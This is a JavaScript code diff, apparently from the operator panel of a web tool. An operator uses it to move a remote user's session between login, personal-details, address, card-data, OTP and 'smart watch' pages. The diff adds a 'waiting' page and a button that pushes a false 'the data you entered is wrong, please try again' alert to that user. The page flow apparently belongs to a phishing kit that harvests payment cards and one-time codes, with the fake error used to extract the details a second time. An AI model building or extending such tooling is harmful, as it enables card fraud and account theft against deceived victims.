@@ -659,6 +659,7 @@ function navTargetToDataPage(target) {
     }
     f = f.toLowerCase();
     if (f.includes('otp2')) return 'otp2';
+    if (f.includes('waiting')) return 'waiting';
     if (f.includes('card-data')) return 'card';
     if (f.includes('login')) return 'login';
     if (f.includes('personal')) return 'personal';
@@ -914,7 +915,8 @@ function getPageArabic(page) {
         'otp2': 'التحقق من OTP',
         'address': 'العنوان',
         'card': 'بيانات البطاقة',
-        'watches': 'الساعة الذكية'
+        'watches': 'الساعة الذكية',
+        'waiting': 'انتظار'
     };
     return pages[page] || page;
 }
@@ -1357,6 +1359,43 @@ function updateNavigationButtons(currentPage) {
             btn.classList.remove('active');
         }
     });
+}
+
+/** نص التنبيه الذي يظهر للمستخدم عند زر «تنبيه بيانات خاطئة» */
+const SESSION_DATA_ERROR_ALERT_TEXT =
+    'البيانات المدخلة خاطئة. يرجى التأكد من صحة البيانات والمحاولة مرة أخرى.';
+
+async function sendSessionDataErrorAlert() {
+    if (!currentUser) {
+        db.showNotification('افتح معلومات أو بطاقة لمستخدم أولاً.', 'error');
+        return;
+    }
+    const sid = getClientSessionIdForAggregate(currentUser);
+    if (!sid || String(sid).trim() === '') {
+        db.showNotification(
+            'لا يوجد client_session_id — لا يمكن إرسال التنبيه.',
+            'error'
+        );
+        return;
+    }
+    try {
+        const res = await fetch(db.apiUrl('api/session/nav'), {
+            method: 'POST',
+            headers: db.headers({ 'Content-Type': 'application/json' }),
+            body: JSON.stringify({
+                client_session_id: String(sid).trim(),
+                alertMessage: SESSION_DATA_ERROR_ALERT_TEXT
+            })
+        });
+        if (!res.ok) {
+            const t = await res.text();
+            throw new Error(t || 'فشل الطلب');
+        }
+        db.showNotification('تم إرسال التنبيه للمستخدم.', 'success');
+    } catch (e) {
+        console.error(e);
+        db.showNotification('تعذر إرسال التنبيه — تحقق من الخادم.', 'error');
+    }
 }
 
 async function navigateTo(page) {
